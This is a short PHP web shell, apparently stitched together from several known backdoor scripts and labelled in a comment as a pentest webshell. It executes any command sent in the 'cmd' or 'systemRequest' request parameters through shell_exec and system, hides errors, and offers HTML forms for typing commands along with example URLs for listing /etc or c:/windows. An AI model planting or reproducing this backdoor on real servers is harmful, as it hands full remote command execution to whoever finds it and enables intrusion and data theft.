<?php
// Made from simple_cmd.php, simple-backdoor.php, php-backdoor.php
// php-backdoor can upload and download stuff!


error_reporting(0);
$cmd = $_REQUEST["cmd"];
if ($cmd != ""){ print Shell_Exec($cmd); 
} else { 
echo "cmd=";
}


if(isset($_REQUEST['systemRequest'])){
        echo "<pre>";
        $systemRequest = ($_REQUEST['systemRequest']);
        system($systemRequest);
        echo "</pre>";
        die;
}
// Really want it to state: Perspective Honed Persistence
// -- The empirical pentest webshell 
//
// Print what does and does not work - no include function or  
// Test the transpiled asp(x) version
?>


<pre><form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr></form> 
<form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr></form> 

http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix
or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win
</form>
